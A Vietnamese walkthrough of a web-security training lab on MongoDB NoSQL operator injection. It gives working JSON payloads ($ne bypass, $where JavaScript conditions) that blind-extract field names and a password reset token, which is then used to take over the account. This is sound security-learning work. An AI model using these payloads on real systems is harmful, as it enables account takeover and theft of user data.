# **Lab: Exploiting NoSQL operator injection to extract unknown fields**

>  The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.  
To solve the lab, log in as `carlos`.  

* To solve the lab, you'll first need to exfiltrate the value of the password reset token for the user carlos.

# **Solution**

Truy cập trang đăng nhập, nhận thấy có chức năng `Forgot Password`.  

Trước tiên thử đăng nhập. Nhiệm vụ lần này là đăng nhập vào tài khoản `carlos`.

```
# request
POST /login HTTP/2
Host: 0ac1000f042318cd807f3565003a00f4.web-security-academy.net
Cookie: session=rkargxA5fpXd2uQ1s0YjDPDo2xnAaB4a
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ac1000f042318cd807f3565003a00f4.web-security-academy.net/login
Content-Type: application/json
Content-Length: 40
Origin: https://0ac1000f042318cd807f3565003a00f4.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"username":"carlos","password":"12345"}
```

```
# response

Invalid username or password 
```

Tất nhiên là đăng nhập không thành công. Kiểm tra gói tin login vừa rồi ta thấy ứng dụng sẽ gửi thông tin đăng nhập dạng JSON bao gồm 2 cặp key-value là `username` và `password`.  
Giờ thử bypass bằng cách đơn giản đã từng dùng:

```
{"username":"carlos","password":{"$ne":""}}
```

```
Account locked: please reset your password
```

Lần này không còn thông báo sai tên đăng nhập, mật khẩu nữa mà là `Account locked`. Như vậy nghĩa là kỹ thuật bypass trên có tác dụng nhưng tài khoản đã bị khóa, cần reset password bằng chức năng `Forgot Password`.  

Giờ sửa lại req để thử xét điều kiện được gửi đi trong JSON:  

```
# req condition false

{"username":"carlos","password":{"$ne":""}, "$where":"function(){return 0;}"}
```

```
# response condition false

Invalid username or password 
```
```
# req condition true

{"username":"carlos","password":{"$ne":""}, "$where":"function(){return 1;}"}
```

```
# response condition true

Account locked: please reset your password
```

Sau khi thêm điều kiện where đi kèm trong đối tượng JSON, thì ngoài việc xét đúng sai của `username`, `password` còn cần xét đúng sai của điều kiện.  
Nhận thấy thông báo thay đổi theo điều kiện where nên ta xác định được toán tử where đi kèm được ứng dụng chấp nhận và thực thi.  

Khi học về Mongodb, nếu xét một đối tượng dữ liệu:

```
let userInfo = {
    "_id":"id_auto_created_by_mongodb",
    "username":"input",
    "password":"input",
}

db.users.findOne(userInfo);
```

```
Object.keys(userInfo)
>>> Array(3) [ "_id", "username", "password" ]

Object.keys(userInfo)[0]
>>> "_id"

Object.keys(userInfo)[1]
>>> "username"

Object.keys(userInfo)[2]
>>> "password"

Object.keys(userInfo)[20]
>>> undefined
```

Ta thấy để truy xuất từng field của đối tượng dữ liệu có thể thông qua `Object.keys(userInfo)[]`.  

Thường mongodb sẽ tự động tạo field "_id" ở đầu mỗi object. Giờ thử kiểm tra bằng cách sau:

```
{"username":"carlos","password":{"$ne":""}, "$where":"function(){if(Object.keys(this)[0].match('_id')) return 1; else 0;}"}
```

```
Account locked: please reset your password
```

Trong mongodb, khi dùng toán tử `$where` ta có thể dùng `this` hoặc `obj` để truy xuất vào tài liệu hiện tại.  

Ở req trên ta đã thêm lệnh if để kiểm tra trường đầu tiên `Object.keys(this)[0]` xem có phải là `'_id'` không.  
Nếu đúng thì trả về 1 (`'Account locked'`), ngược lại là 0 (`'Invalid'`).

Và dựa theo response trả về ta xác định chắc chắn trường đầu tiên là `_id`. Ngoài ra cũng xác định được kỹ thuật tấn công mù trên có thể thực hiện.  

```
{"username":"carlos","password":{"$ne":""}, "$where":"function(){if(Object.keys(this)[1].match('random_field_name')) return 1; else 0;}"}

>>> Invalid

{"username":"carlos","password":{"$ne":""}, "$where":"function(){if(Object.keys(this)[0].match('random_field_name')) return 1; else 0;}"}

>>> Invalid

{"username":"carlos","password":{"$ne":""}, "$where":"function(){if(Object.keys(this)[3].match('random_field_name')) return 1; else 0;}"}

>>> Invalid

{"username":"carlos","password":{"$ne":""}, "$where":"function(){if(Object.keys(this)[4].match('random_field_name')) return 1; else 0;}"}

>>> Invalid

{"username":"carlos","password":{"$ne":""}, "$where":"function(){if(Object.keys(this)[5].match('random_field_name')) return 1; else 0;}"}

>>> Internal Server Error
```

Dựa theo chuỗi truy vấn trên, ta xác định trước như sau:  

1. Account locked: True condition
2. Invalid: False condition
3. Internal Server Error: Index invalid

Vậy là ta thấy tài liệu đang xét có 5 trường. Ngoài `_id` thì còn 4 trường chứa thông tin đăng nhập khác.  
(Thực ra có thể đoán 2 trường nữa là username và password và thử trong req nhưng tôi muốn làm như mình "mù" :v)  
Thêm nữa, hãy nhớ gửi req Forgot Password nếu không ứng dụng sẽ không tạo trường thứ 5.  

Tiếp theo làm một phép thử khác như sau:  

```
{"username":"carlos","password":{"$ne":""}, "$where":"function(){if(Object.keys(this)[1].length==0) return 1; else 0;}"}
>>> Invalid

{"username":"carlos","password":{"$ne":""}, "$where":"function(){if(Object.keys(this)[1].length!=0) return 1; else 0;}"}
>>> Account locked
```

Nhận thấy ta có thể dùng cách này để truy xuất độ dài field name và hơn thế nữa là bruteforce để lấy fieldname.  
Giờ send req trên tới Intruder của Burpsuite và bắt đầu Bruteforce:

Dựa vào phản hồi là suy luận thu được kết quả:
```
Object.keys(this)[0].length : 3
Object.keys(this)[1].length : 8
Object.keys(this)[2].length : 8
Object.keys(this)[3].length : 5
Object.keys(this)[4].length : 10
```

Đã có độ dài từng field, giờ sửa req như sau để truy xuất từng ký tự trong fieldname:

```
{"username":"carlos","password":{"$ne":""}, "$where":"function(){if(Object.keys(this)[1][0]=='a') return 1; else 0;}"}
```

Sau khi Bruteforce thu được kết quả:

```
Object.keys(this)[0] : _id
Object.keys(this)[1] : username
Object.keys(this)[2] : password
Object.keys(this)[3] : email
Object.keys(this)[4] : pwResetTkn
```

Vẫn dùng kỹ thuật tương tự để tìm độ dài của `email`, `pwResetTkn` thôi. Vì cần `reset password` và đã biết username nên không cần tốn thời gian tìm 2 field trên.

```
{"username":"carlos","password":{"$ne":""}, "$where":"function(){if(this.email.length==0) return 1; else 0;}"}

{"username":"carlos","password":{"$ne":""}, "$where":"function(){if(this.email[0]=='a') return 1; else 0;}"}
```

```
email lenght: 25
pwResetTkn length: 16
```

```
{"username":"carlos","password":{"$ne":""},"$where":"function(){if(this.pwResetTkn.match('^.{0}a.*')) return 1; else 0;}"}
```

Lần này dùng regex trong hàm `match()` để cắt và so sánh từng ký tự trong chuỗi. trong `Intruder` của Burpsuite đặt thay đổi giá trị `0` và `a`, chọn phương thức `Cluster Bomb Attack` để thực hiện Bruteforce:

```
email: carlos@carlos-montoya.net
pwResetTkn: e32dc76da4f908f5
```

Lưu ý rằng việc tìm bằng match chứa biểu thức regex thì khi bruteforce chứa ký tự `.` sẽ phá vỡ cấu trúc của biểu thức regex và cho kết quả không đúng. Nên nếu dùng biểu thức regex trên sẽ không tìm được ký tự `.` ở position 21. Nhưng trong lab này thì email không quan trọng và không dùng đến. Có thể thay biểu thức regex bằng toán tử so sánh ký tự thông thường.

Sau khi đã có `pwResetTkn` tiếp theo ta cần tìm nơi để sử dụng nó.  
Dễ dàng đoán được nó dùng để reset password nên có khả năng dùng trong trang `Forgot Password`.  
Tìm lại request `GET /forgot-password`:

```
GET /forgot-password HTTP/2
Host: 0ad7006e048d4889805e1727008500f6.web-security-academy.net
Cookie: session=iy2MPIXc7V53ShlQXQ8JC7N51U4Yb6e6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0ad7006e048d4889805e1727008500f6.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers


```

Nhìn qua request ta thấy không có gì đặc biệt, hãy thử thêm một tham số trong req này:

```
GET /forgot-password?randomName=xxx HTTP/2
```

Xác nhận khi gửi yêu cầu không có điều gì khác trong response. Thử thay tên tham số trên bằng field name `pwResetTkn`:

```
GET /forgot-password?pwResetTkn=xxx HTTP/2
```

```
"Invalid token"
```

Lần này thì đã có khác biệt. Thông báo cho thấy tham số được thêm đã được chấp thuận và thực thi bởi ứng dụng.  
Hãy thay nó bằng token ta tìm được:

```
GET /forgot-password?pwResetTkn=e32dc76da4f908f5 HTTP/2
```

Nice~ Thành công truy cập trang reset password.  
Giờ quay lại browser để truy cập trang đó thôi, lần này là thêm tham số trên URL:

```
https://0ad7006e048d4889805e1727008500f6.web-security-academy.net/forgot-password?pwResetTkn=e32dc76da4f908f5
```

Sau khi nhập mật khẩu mới thành công sẽ bị chuyển hướng về trang chính. Chỉ cần quay lại trang đăng nhập và đăng nhập thôi~~

Done